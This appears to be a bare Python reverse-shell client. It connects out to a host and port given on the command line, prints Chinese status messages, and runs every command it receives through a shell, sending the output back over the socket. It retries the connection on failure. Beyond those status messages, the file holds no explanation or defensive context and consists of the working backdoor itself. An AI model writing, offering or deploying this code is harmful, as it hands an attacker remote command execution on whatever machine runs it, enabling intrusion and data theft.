import socket
import subprocess
import getopt
import sys
ip,com=getopt.getopt(sys.argv[1:],"u:p:")
i=ip[0][1]
p=int(ip[1][1])
# print(type(i))
# print(type(p))
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def connect():
    global i
    global p
    try:
        client.connect((i,p))
        print("连接服务器成功！")
    except OSError as result:
        print("连接服务器错误！")
        connect()
    while True:
        # text=input("输入：")
        # client.send(text.encode("utf-8"))
        text=client.recv(1024).decode("utf-8")
        # print("收到：", text)
        p=subprocess.Popen(text,shell=True,stdout=subprocess.PIPE)
        out, err = p.communicate()
        for line in out.splitlines():
            client.send(line)

connect()